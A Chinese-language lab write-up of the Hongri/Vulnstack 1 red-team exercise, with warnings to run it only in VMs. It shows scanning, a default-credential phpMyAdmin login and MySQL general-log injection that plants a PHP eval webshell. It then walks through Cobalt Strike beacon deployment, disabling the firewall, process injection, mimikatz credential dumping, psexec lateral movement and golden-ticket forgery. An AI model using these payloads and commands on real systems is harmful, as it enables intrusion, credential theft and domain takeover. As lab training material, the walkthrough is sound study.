# 红日靶场 1 蒟蒻笔记

---

## 环境配置

>[!CAUTION]
>
> **警告！**
>
> 为保证不发生不可预测的严重后果，请不要在真实的网络环境中进行此实验。请在虚拟机环境中完成本试验。推荐使用 [VMware Workstation Pro](https://vmware.xznkjzx.cn/)。

>[!IMPORTANT]
>
>1. 你需要下载 [红日靶场 1](http://vulnstack.qiyuanxuetang.net/vuln/detail/2/)
>2. 推荐使用 [kali](https://www.kali.org/) 作为攻击机。
>3. 建议在实验前，下载并安装好 [中国蚁剑](https://github.com/AntSwordProject/) 和 [Cobalt Strike](https://lololowe.lanzoul.com/b0fpjwwxc?pwd=2xhh)。

### 靶机配置
1. 通过扫描红日靶场 1 的本地存储目录添加虚拟机。
2. 编辑 $\rightarrow$ 虚拟网络编辑器 $\rightarrow$ 更改配置 $\rightarrow$ 配置网络如下（只用管 VMnet2 和 VMnet8，其中 VMnet8 的NAT 模式无需保证子网地址一致，但 VMnet2 一定要保证子网地址一致）：
![VMnet-set](VMnet-set.png)
3. 依次编辑三台靶机设置，调整 ```网络适配器``` 为 ```自定义(VMnet2)```
4. 编辑 win7 靶机设置，添加 ```网络适配器 2``` 为 ```NAT``` 模式
5. 进入各靶机，密码为：```hongrisec@2019```，极大概率会让你重置密码，我们重置为 ```Admin123!```
6. 进入各靶机，打开 ```cmd``` 或 ```powershell```，运行指令 ```ipconfig``` 查看本机 ip 地址。应如下：

| 机器名称 | ip 地址（VMnet2） |
|:-:|:-:|
| Windows Server 2008 R2 x64 | 192.168.52.138 |
| Windows 7 x64 | 192.168.52.143 |
| Win2K3 Metasploitable | 192.168.52.141 |

7. 为方便后续操作进行，现展示本蒟蒻的 ```NAT``` 模式下的 kali 和 win7 的 ip 地址，在笔记用到下面 ip 地址时，请替换为自己对应虚拟机的 ip 地址。（在 kali 中，命令变为 ```ifconfig```）

| 机器名称 | ip 地址（NAT） |
|:-:|:-:|
| kali | 192.168.114.130 |
| Windows 7 x64 | 192.168.114.129 |

### 蚁剑安装与使用教程

[蚁剑](https://github.com/AntSwordProject/)

![AntSword-master](AntSword-master.png)

![AntSword-Loader](AntSword-Loader.png)

![AntSword-Loader-zip](AntSword-Loader-zip.png)

[获取蚁剑](https://www.yuque.com/antswordproject/antsword/srruro)

在 kali 中解压缩，打开 Loader 双击 AntSword 初始化选择 master 文件夹。

>[!TIP]
>
>这里建议全屏打开 kali，同时适当缩小并上移窗口，初始化选择文件夹那个窗口有概率会很大，可能会看不到底下的选择键。（当时本蒟蒻还以为哪里出错了）

### Cobalt Strike 安装与使用教程

[Cobalt Strike](https://lololowe.lanzoul.com/b0fpjwwxc?pwd=2xhh) 密码是：```2xhh```

[Cobalt Strike 安装和基本使用方式](https://blog.lololowe.com/posts/7126/)

在 kali 中解压缩，分别用两个终端打开文件夹。

在终端 1 中，运行命令，启动 Cobalt Strike 服务端

```bash
# 格式为： sudo ./teamserver <kali NAT ip> <kali password>
sudo ./teamserver 192.168.114.130 kali
```

正常情况如下：

![cs-teamserver](cs-teamserver.png)

在终端 2 中，运行命令，启动 Cobalt Strike 客户端

```bash
./cobaltstrike
```

如下配置

![cs-client](cs-client.png)

>[!TIP]
>
>第一次运行时有概率因没有执行权限而报错
>请运行：
>
>```bash
>chmod +x teamserver
>```
>或
>```bash
>chmod +x cobaltstrike
>```
>以添加相应权限

>[!TIP]
>
>对于 cs4.5 而言，过高的 JDK 版本也会导致报错
>请下载低版本 [JDK11](https://adoptium.net/zh-CN/temurin/releases?version=11&os=any&arch=any)
>并在启动客户端前运行命令，临时更改 JDK 版本
>```bash
># 格式为：export JAVA_HOME= <path to jdk-11>
>export JAVA_HOME=/home/kali/Tools/jdk-11.0.32+9/
>```
>与
>```bash
>export PATH=$JAVA_HOME/bin:$PATH
>```
>然后再在同一终端启动客户端

---

## 实验过程

>[!TIP]
>
>建议在实验开始前，给四台机器分别打上快照，方便后续重复实验。
>
>关机状态打快照速度更快

>[!TIP]
>
>由于靶机的配置相对较差，有的时候反应较慢，请耐心等待，避免因重复操作而产生非预期结果。

### 启动服务网页服务

打开 win7 的 C 盘，进入 phpStudy 文件夹，双击运行 phpStudy.exe 文件

![start-phpStudy](start-phpStudy.png)

使用 Firefox 访问 localhost 查看网页服务是否正常启动。

![localhost-check-phpStudy](localhost-check-phpStudy.png)

>[!NOTE]
>
><details>
><summary> 
>我们打开的这个 phpStudy 探针网页是个是么东西？ 
></summary>
>
>$\;$
>
>它不是一个真正意义上的网站，而是一个开发环境的默认页面，常用于开发人员进行自检。
>
>如果把搭网站比作建商店的话，那这页就是标记了哪里走线哪里走管道的详细施工图纸。开发人员可以利用它检查店铺建的对不对；而攻击者则可以利用它知道切断哪里整个店铺就会彻底停水停电，即哪里存在漏洞，可以作为攻击点切入。
>
>正常的网站（比如百度）只能看到商店希望展出的商品，而非默认的明晃晃粘在大门上的详细施工图纸。
>
></details>

>[!TIP]
>
>这里是在 win7 打开网站，用于确定 web 服务搭起来了，确保实验能正常进行，需要和后续在 kali 上打开区分。

### 信息搜集

#### 网段扫描

<details>
<summary>
我个人认为其实完全没有必要。
</summary>

$\;$

在实际工作中，如果有渗透测试的要求，甲方一般会在合同中写明授权测试范围是具体哪几个网段或哪几个 ip 地址。请根据实际情况进行扫描。

</details>

>[!CAUTION]
>
>对未授权网段或者 ip 地址进行详细扫描构成违法行为。

<details>
<summary>
学习如何进行网段扫描
</summary>

$\;$

在 kali 上打开终端运行命令扫描网段内活跃主机。

```bash
nmap -sn 192.168.114.0/24
# -sn 不进行端口扫描，仅扫描活跃主机，提高速度
```

>[!NOTE]
>
><details>
><summary>
>为什么是 xxx.xxx.xxx.0/24
></summary>
>
>$\;$
>
>首先，我们需要知道 ipv4 地址是 32 位的二进制数
>
>```/24``` 表示前 24 位是网络号，属于同一网段，要扫描的就是这个网段下的 $2^8=256$ 个网络地址。
>
>所以最终的扫描范围就是：
>
>```
>192.168.114.0    ← 网络地址（不可用）
>192.168.114.1    ← 通常是网关
>192.168.114.2
>192.168.114.3
>...
>192.168.114.254  ← 最后一个可用主机
>192.168.114.255  ← 广播地址（不可用）
>
>可用主机：1 ~ 254，共 254 台
>```
>
>Q: 那为什么不是 .1/24 或 .130/24?
>
>A: 不是不行，只是大家约定俗成写成 .0/24，写成 .1/24 或 .130/24 也能表示同一网段不过就是不规范罢了
>
></details>

![nmap-for-whole-map](nmap-for-whole-map.png)

</details>

#### 端口扫描

打开终端运行命令，扫描 win7 所有端口

```bash
nmap 192.168.114.129
```

![nmap129](nmap129.png)

通过扫描我们发现它开放了 $80$ 端口，运行了一个 HTTP 服务。

那么，我们就可以直接用 Firefox 访问 192.168.114.129

![kali-visit-win7-http](kali-visit-win7-http.png)

>[!NOTE]
>
><details>
><summary>
>192.168.114.129 不是 win7 的 ip 地址吗？为什么可以直接用浏览器访问？
></summary>
>
>$\;$
>
>我们或许习惯于在浏览器地址栏输入：```baidu.com```去访问网页。但实际上，浏览器需要的是 ```baidu.com``` 这个域名通过 DNS 服务器 解析出来的 ip 地址（111.63.65.103）。
>
>当我们在浏览器地址栏输入 192.168.114.129 并按回车确认后，浏览器实际上是在向 192.168.114.129 请求访问 80 端口（浏览器默认采用 80 端口支持的 HTTP 服务，如果是 HTTPS 服务则一般是采用 443 端口）。
>
>截至目前只是请求访问，具体能否访问成功，还要取决于对应 ip 地址的主机是否监听了 80 端口以及是否在其上部署了服务。
>
>依然用店铺来举例，浏览器拿到了目标 ip，于是他派了一个人前往目标 ip 的 80 号店铺敲门。
>
>- 如果目标主机没有监听 80 端口，相当于 80 号店铺无人值守，自然不会有人给你开门，也就自然不会有响应。
>
>- 如果目标主机监听了 80 端口，则相当于 80 号店铺有人值守，门开了，访问成功。
>
>- - 但是，如果目标主机没有部署相应服务，则相当于，门开了，但是店铺是空的，值守人员开了门，跟你打了个招呼然后就沉默了。
>
>- - 而我们的 win7 部署了相应服务，所以值守人员不仅打开了店铺的门，打了招呼，还将访问人员迎进了店铺内，并展示店铺里的商品，也就是提供了相应的服务，浏览器就会能看到网页。
>
></details>

从这个页面中我们能清晰地知道关于这个 web 服务的一系列环境信息。尤其是 “ 绝对路径：```C:/phpStudy/WWW``` ” 暴露了这个网站的根目录，对于后续操作服务器中文件的具有重要作用（毕竟如果不知道绝对路径，就像徒有专业的撬锁工具却找不到需要撬的门）。

当然，在真实渗透测试环境中，我们还可以利用这个页面提供的服务器系统等信息，去查找已知系统漏洞，但在本实验中不过多展开。

#### 目录爆破

既然我们不知道其他漏洞，且提供 Web 服务，那么我们按照流程一般就要进行目录爆破来寻找隐藏路径中的漏洞。常见隐藏路径及其作用：

| 扫出来的东西 | 可能导致 |
|-------------|---------|
| `/admin` 后台 | 弱口令登录 → 直接拿权限 |
| `/config.php.bak` | 泄露数据库账号密码 |
| `/.git/` | 泄露全部源代码 |
| `/phpmyadmin/` | 直接操作数据库 |
| `/upload/` | 文件上传漏洞 → 传 Webshell |
| `/backup.zip` | 下载整站源码 → 审计找漏洞 |
| `/test.php` | 测试页面往往没做安全防护 |
| `/.env` | 泄露各种密钥、密码 |

我们打开终端用 kali 自带的 dirb 工具进行目录爆破（当然也可以用 dirsearch、gobuster 抑或是 WFUZZ 进行爆破，欢迎各位读者自行尝试）。

```bash
dirb http://192.168.114.129
```

![dirb](dirb.png)

我们只看这个网页下一层内容，再深的暂时不看，发现了一个 phpinfo.php 网页和两个 phpmyadmin 目录，不过显然这两个目录本质上应该没有什么区别。

分别使用 Firefox 登录这两个页面。

![phpinfo-1](phpinfo-1.png)

![phpmyadmin-login](phpmyadmin-login.png)

先说 phpinfo 界面。这个界面与 php 探针的默认界面作用类似，都是用于自查的房屋详细设计说明图。不过这个界面上的内容更丰富更具体。

![phpinfo-2](phpinfo-2.png)

我们向下浏览这个页面可以看到 web 服务器的具体类型是 Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 依旧可以查找其已知漏洞，不过本试验不过多展开。

![phpinfo-3](phpinfo-3.png)

继续往下翻，同样能看到文件根目录：```C:/phpStudy/WWW```。

在实际渗透测试中，phpStudy 的那个默认界面一般都会删除（不然你自己做的网页放哪）但是 phpinfo.php 页面经常会有忘记删除的情况。

### 突破外网服务器

#### 弱口令登录

接下来看另外一个 phpmyadmin 页面，它是一个网页管理 MySQL 数据库的工具。由于这个 web 服务环境是由 phpStudy 搭起来的，我们尝试默认 账号/密码：root/root。

![phpmyadmin-localhost](phpmyadmin-localhost.png)

然后就发现：诶？！试对了！进来了……

#### 日志注入

根据网上公开漏洞可知 phpmyadmin 存在日志注入漏洞。

切换到 SQL 语句执行界面，查询日志所在位置。

```sql
SHOW VARIABLES LIKE '%general%';
-- VARIABLES 是 MySQL 的系统变量（配置项）
--      在这句话中作为 SHOW 的参数表示要查看的是变量
-- LIKE 模糊匹配
-- % 通配符，表示任意字符串
```

![phpmyadmin-SQL-showlog-1](phpmyadmin-SQL-showlog-1.png)

![phpmyadmin-SQL-showlog-2](phpmyadmin-SQL-showlog-2.png)

>[!NOTE]
>
><details>
><summary>
>日志的英文单词不是 log 吗？为什么要查 general?
></summary>
>
>$\;$
>
>在 MySQL 中，有四种日志。
>
>| 日志名 | 变量名 | 记录什么 |
>|--------|--------|----------|
>| General Log（通用日志） | `general_log` | 所有 SQL 语句，一条不漏 |
>| Binary Log（二进制日志） | `log_bin` | 数据变更（INSERT/UPDATE/DELETE） |
>| Slow Query Log（慢查询日志） | `slow_query_log` | 执行超过 N 秒的慢 SQL |
>| Error Log（错误日志） | `log_error` | 报错信息 |
>
>同时在 MySQL 中，general 的意思是 “通用的、全部的”。一般情况下，其他的变量名都会根据实际作用有相应的前缀修饰，只有 general_log 才配使用 general 这种特别宏大的修饰。
>
></details>

通过这个界面，我们可以看到目前这个日志的读写功能是关闭的，且存储位置在 ```C:\phpStudy\MySQL\data\stu1.log```

我们需要将日志的存储位置更换到网页根目录下，这样我们就能直接在浏览器上访问了。

```sql
SET GLOBAL general_log_file="C:\\phpStudy\\WWW\\shell.php"
-- GLOBAL 表示全局作用域
```

同时，我们还需要开启日志的读写功能以方便注入。

```sql
SET GLOBAL general_log="On"
```

重新查看日志信息

```sql
SHOW VARIABLES LIKE '%general%';
```

![phpmyadmin-SQL-showlog3](phpmyadmin-SQL-showlog3.png)

说明更改成功

现在，我们将一句话木马写入到文件中

```sql
SELECT '<?php @eval($_POST["888"]);?>'
-- SELECT 正常来讲是 SQL 查询语句，但是由于其后没有 FROM、没有表名，它不查任何数据，只是让 MySQL 把这个字符串输出出来。
-- <?php ... ?> 是 PHP 的起止代码，告诉服务器这里是 PHP 代码，请执行
-- @ 是错误抑制符，表示如果出现错误隐藏不显示
-- eval( ... ) 表示把括号里的字符串当作 PHP 代码执行
-- $_POST["888"] 从 HTTP POST 请求中取参数名为 888 的值
-- 语句结束标志
```

![phpmyadmin-SQL-loginject](phpmyadmin-SQL-loginject.png)

写入成功，接下来用蚁剑进行连接。

![connect-externalnetworkserver-1](connect-externalnetworkserver-1.png)

![connect-externalnetworkserver-2](connect-externalnetworkserver-2.png)

![connect-externalnetworkserver-3](connect-externalnetworkserver-3.png)

![connect-externalnetworkserver-4](connect-externalnetworkserver-4.png)

>[!NOTE]
>
><details>
><summary>
>布什戈门，咱们怎么就如此草率轻松的拿下外网服务器了？！这中间发生了什么？
></summary>
>
>$\;$
>
>这么看好像这句话并没有什么问题，只是单纯的输出一句话而已。但是，它被日志（特指 general_log ）如实的记录了下来。当我们从 win7 用 Firefox 打开日志文件（ ```C:\phpStudy\WWW\shell.php``` ）时就会发现类似如下文本
>
>```
>260803 13:41:24	   26 Connect	>root@localhost on 
>		   26 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
>		   26 Query	SELECT '<?php @eval($_POST["888"]);?>'
>		   26 Quit	
>```
>
>我们需要注意，这个文件保存在哪? ```C:\phpStudy\WWW``` 这是网站的对外根目录，外部用户也能访问它。跟要命的是：它的是一个后缀为 .php 的文件。因此，它会被 Web 服务器交给 PHP 解析器处理。
>
>```php
><?php @eval($_POST["888"]);?>
>```
>
>这一语句被解析执行。而根据 PHP 语言的特性，它会将请求中的 “888” 被赋予的值直接替换进去，因此我们只需要用蚁剑向它发送包含 ```888=...``` HTTP 请求，服务器就会执行 ```...```。
>
>举个例子：
>
>蚁剑发送 HTTP POST 请求
>
>```http
>POST /shell.php HTTP/1.1
>Host: 目标IP
>Content-Type: application/x-www-form-urlencoded
>
>888=echo "antsword_connected";
>```
>
>服务器执行：
>
>```http
>echo "antsword_connected";
>```
>
>响应返回包含 ```antsword_connected``` 说明连接成功
>
>同理，蚁剑可以通过发送 HTTP POST 请求进行其他包括但不限于读取文件目录架构、增删改文件、运行系统命令等操作，从而实现全面控制外网服务器。
>
></details>

至此，我们成功拿下了外网服务器。

### 内网渗透

#### CS 上线 web 服务器

>[!NOTE]
>
><details>
><summary>
>我们不是刚刚通过蚁剑已经拿下外网服务器了吗？为什么还要动它？
></summary>
>
>$\;$
>
>我们前面使用蚁剑控制外网服务器的方式严重依赖于 shell.php 文件。一旦文件被删，就会前功尽弃。同时，该种方式有极其明显的 ```eval( ... )``` 执行特征，非常不隐蔽。因此，在用蚁剑“撬开门”之后，我们需要用 CS 上线来在该外网服务器上“安家”。
>
></details>

在 kali 上启动 Cobalt Strike 服务端：

```bash
sudo ./teamserver 192.168.114.130 kali
```

![cs-teamserver](cs-teamserver.png)

在 kali 上启动 Cobalt Strike 客户端：

```bash
./cobaltstrike
```

![cs-client](cs-client.png)

如图添加监听器：

![add-listener](add-listener.png)

如图创建后门程序：

![create-hongrisec-1](create-hongrisec-1.png)

![create-hongrisec-2](create-hongrisec-2.png)

我将生成的文件保存为 ```~/Documents/hongrisec.exe```

利用蚁剑进行上传

![upload-hongrisec](upload-hongrisec.png)

![upload-hongrisec-success](upload-hongrisec-success.png)

在蚁剑空白处右键打开终端运行 ```hongrisec.exe```，并等待 CS 上线

![run-hongrisec](run-hongrisec.png)

当我们看见 CS 界面中出现会话，说明上线成功。

>[!NOTE]
>
><details>
><summary>
>名为 hongri 的监听器和这个 hongrisec.exe 的可执行文件分别有什么用？
></summary>
>
>先说 ```hongrisec.exe``` 它是一个木马程序，类似于前面用到的 ```shell.php```。不过，它能提供的控制服务更加全面，是正规驻军。同时，它的通信隐蔽性更强，流量特征较弱，不易被发现。最后，它可以通过后续操作注册为系统服务、写入 Windows 计划任务、或者利用注册表启动项。即使服务器重启，也会自动在后台静默启动，继续向攻击机报到。
>
>而名为 ```hongri``` 的监听器则用于接收木马程序 ```hongrisec.exe``` 的回传数据。
>
></details>

#### 隐蔽

>[!TIP]
>
>从这一步开始，后面的步骤响应速度可能会比较缓慢，请耐心等待

与 ```hongrisec.exe``` 会话进行交互。

关闭防火墙

```bash
shell netsh advfirewall set allprofiles state off
```

![close-firewall](close-firewall.png)

调整回连时间间隔为 1s (默认 1min)

>[!TIP]
>
>实战中不建议这么做，不然流量特征会变得较为明显易被发现

```bash
sleep 1
```

![change-sleeptime](change-sleeptime.png)

##### 迁移进程

木马上线后由于特征明显，为防止未来程序被删所以我们要将进程迁移到别的系统程序上

首先，查看正在运行的进程。

```bash
ps
```

![check-process](check-process.png)

这里我们选择将进程迁移到 ```explorer.exe``` 进程中，```explorer.exe``` 是高信誉进程，安全软件不会轻易拦截

```bash
inject 2964
```

![try-inject-explorer](try-inject-explorer.png)

选择 hongri 监听器，发现不允许

![inject-explorer-fail](inject-explorer-fail.png)

那我们就选择注入到 phpStudy.exe 进程中，同样选择 hongri 监听器

```bash
inject 1528
```

![try-inject-phpStudy](try-inject-phpStudy.png)

发现会话多了一行，说明注入成功。

![inject-phpStudy-success](inject-phpStudy-success.png)

我们将原来的进程 kill 掉

```bash
kill 1640
```

![kill-hongrisec](kill-hongrisec.png)

切换到新进程，同样将回连时间调整为 1s

>[!TIP]
>
>实战中不建议这么做，不然流量特征会变得较为明显易被发现

```bash
sleep 1
```

![change-sleeptime-again](change-sleeptime-again.png)

#### 提升权限

如图提权，选择 hongri 监听器，并使用默认的 svc-exe

![elevate-access](elevate-access.png)

看到会话又多了一个 user 为 SYSTEM* 的会话，说明提权成功。

![elevate-access-finish](elevate-access-finish.png)

同理，切换到高权限进程，并将回连时间调整为 1s

>[!TIP]
>
>实战中不建议这么做，不然流量特征会变得较为明显易被发现

```bash
sleep 1
```

![change-sleeptime-againandagain](change-sleeptime-againandagain.png)

>[!IMPORTANT]
>
>不要把刚刚那个低权限进程 kill 掉。因为前面的这个进程除了我们的木马程序还负责运行正常服务，如果把它 kill 掉了，无异于自爆行为！

#### 内网信息搜集

我们现在已经在外网服务器上建立了长期稳定且隐蔽的连接，接下来，我们要去攻陷更高价值目标（比如域控）。

我们运行命令查看所有当前 TCP/IP 配置值。

```bash
shell ipconfig
```

![ipconfig](ipconfig.png)

发现 win7 上有两个网卡，运行命令查看其他主机名

```bash
net view
```

![net-view](net-view.png)

由此图，我们可知：OWA 是主域控制器（PDC）是整个域环境的核心资产，存储着全部域用户的账户信息与密码哈希。攻陷此目标等同于完全控制 GOD 域。

我们先进行端口扫描

![cs-portscan](cs-portscan.png)

>[!TIP]
>
>这一过程相当缓慢，请耐心等待 ```Scanner module is complete``` 字样出现

![find-445](find-445.png)

发现都打开了 445 端口

#### 横向移动

那我们就利用 445 端口进行横向移动。

>[!NOTE]
>
><details>
><summary>
>445 端口是干啥的？我们能利用它做什么？
></summary>
>
>$\;$
>
>它是现代 Windows 系统中 SMB（服务器消息块）协议的直接载体，专门用于文件共享、打印机共享和进程间通信。
>
>在 Windows 域环境中，当客户端（比如某台员工电脑）想要访问一个网络共享资源，但 DNS 无法解析该主机名时，它会向局域网广播 LLMNR 或 NBT-NS 请求来寻找目标。
>
>攻击者利用工具监听这些广播，并伪装成目标主机进行“欺骗（Poisoning）”。当客户端向攻击者发起 SMB 认证请求时，攻击者就能捕获到客户端发送的认证凭据（通常是 NTLM 哈希值，或者在特定降级攻击下是明文密码）。
>
></details>

如图添加一个 smb 监听器

![create-smb](create-smb.png)

如图抓取明文密码

![mimikatz-password](mimikatz-password.png)

通过翻找输出，我们可以知道密码是：```Admin123!```，域名是 ```GOD.ORG```

>[!IMPORTANT]
>
>一定要记住域名的全称，不要记短域名以防在后续操作中出现问题，建议从 kerberos 那里看

如图进行横向迁移

![psexec](psexec.png)

回到会话列表，等待一会儿发现多了一个 OWA 的会话，说明上线成功。

![jump-PDC](jump-PDC.png)

>[!NOTE]
>
><details>
><summary>
>咱们抓取的不是这台 Web 服务器的密码吗？为什么能用它横向移动上线其他主机？
></summary>
>
>$\;$
>
>在企业环境中，为了方便 IT 运维人员管理成百上千台电脑，管理员通常会通过组策略（GPO）或部署脚本，将所有普通员工电脑（工作站）的本地管理员（Administrator）密码设置得一模一样。
>
>同时在企业环境中，经常会出现用户跨机器登录的情况，比如：域管理员用账号在普通用户机上登录排查故障、财务部人员登录财务专用服务器处理报表……
>
>一台机器上的凭据，往往就是通往其他机器的“万能钥匙”。
>
></details>

同理可上线另外一台主机：```ROOT-TVI862UBEH```

#### 制作黄金票据

>[!NOTE]
>
><details>
><summary>
>什么是黄金票据？为什么要制作黄金票据？
></summary>
>
>$\;$
>
>前置知识：Kerberos 认证协议
>
>在正常的域环境中，用户登录时会向域控（DC）请求一张 TGT（票据授予票据）。这张票据就像是域控给你发的“临时免密通行证”，证明你是合法用户，从而免除每次操作都需要验证账密的繁琐步骤。
>
>而黄金票据攻击的原理是：
>
>攻击者在拿下域控后，提取了域控中一个极其特殊的账号 —— krbtgt 的密码哈希值（Hash）。krbtgt 是 Kerberos 协议的核心，专门负责签发和验证所有的 TGT 票据。
>
>利用这个 Hash，攻击者可以在自己的机器上凭空伪造一张拥有最高权限的 TGT 票据（即黄金票据）。然后，攻击者把这张假票据注入到自己的系统中，域控在验证时会认为它是合法的，从而赋予攻击者整个域的最高权限（通常是域管理员）。
>
>制作黄金票据，主要是为了解决以下三个痛点：
>
>1. **终极的权限维持（不怕改密码）**
>
>$\;\;\;\;\;\;\;\;\;$ 在实战中，防守方（蓝队）一旦发现异常，第一反应通常是修改域管密码或禁用账号。
>
>$\;\;\;\;\;\;\;\;\;$ 普通攻击的局限：如果攻击者只是偷了域管密码，防守方一改密码，攻击者就被踢出去了。
>
>$\;\;\;\;\;\;\;\;\;$ 黄金票据的优势：krbtgt 的密码是域环境初始化时自动生成的，正常情况下永远不会被更改。只要 krbtgt 的 Hash 没变，哪怕防守方把域管密码改了一百次，攻击者依然可以拿着黄金票据随时以域管身份登录任何机器。
>
>2. **绕过正常的认证流程**
>
>$\;\;\;\;\;\;\;\;\;$ 使用黄金票据时，攻击者是离线生成 TGT 票据的。这意味着攻击者在访问域内资源时，直接跳过了向域控请求票据的步骤。这种“免检通道”极大地降低了被域控安全日志记录的风险，隐蔽性极强。
>
>3. **随心所欲地伪造身份**
>
>$\;\;\;\;\;\;\;\;\;$ 因为票据是攻击者自己伪造的，攻击者可以随意指定票据上的用户名、用户组（比如直接加上 Domain Admins 组）甚至有效期。这让攻击者在域内横行无忌，可以访问任何文件服务器、数据库或执行任何管理操作。
>
></details>

切换到 OWA 会话抓取哈希

![get-hash](get-hash.png)

输入命令查看本机 SID （安全标识符）

```bash
shell whoami /all
```

![get-SID](get-SID.png)

>[!NOTE]
>
><details>
><summary>
>为什么要抓取哈希和 SID？
></summary>
>
>$\;$
>
>抓取的哈希是 krbtgt 的密码哈希值（Hash），攻击者需要用这个 Hash 作为密钥，“签发”并加密自己伪造的 TGT 票据。
>
>如果没有这个 Hash，攻击者就无法生成一张能被域控和目标服务器信任的票据。
>
>SID（Security Identifier，安全标识符）是 Windows 操作系统内部用来唯一标识用户、组或计算机账户的一串字符，可以把它理解为“系统内部的身份证号”
>
>攻击者需要把自己的 SID 替换成 Domain Admins 组的 SID，从而在票据中伪装成域管。
>
></details>

根据已知信息，制作黄金票据

![create-goldenticket-1](create-goldenticket-1.png)

![create-goldenticket-2](create-goldenticket-2.png)

看到输出 ```Golden ticket for 'Administrator @ GOD.ORG' successfully submitted for current session``` 说明成功生成黄金票据

![create-goldenticket-success](create-goldenticket-success.png)

## 完成实验

至此，我们算是彻底完全攻陷了全域。

以图形式展示会话如下：

![finish-experiment](finish-experiment.png)

## 实验清理

我们可以选择将四台虚拟机恢复到实验前快照的状态，如果没有打快照，那建议直接将四台虚拟机全部扬了重装，以防历史数据影响实验。

---

## 参考文献
1. [ATT&CK实战系列：红日靶场1（内网攻防实战）详细打靶思路](https://blog.csdn.net/2301_80007437/article/details/159826652)
2. [ATT&CK 红队靶场实战 - 红日靶场 1](https://blog.lololowe.com/posts/bb48/)
3. [获取蚁剑](https://www.yuque.com/antswordproject/antsword/srruro)
4. [Cobalt Strike 安装和基本使用方式](https://blog.lololowe.com/posts/7126/)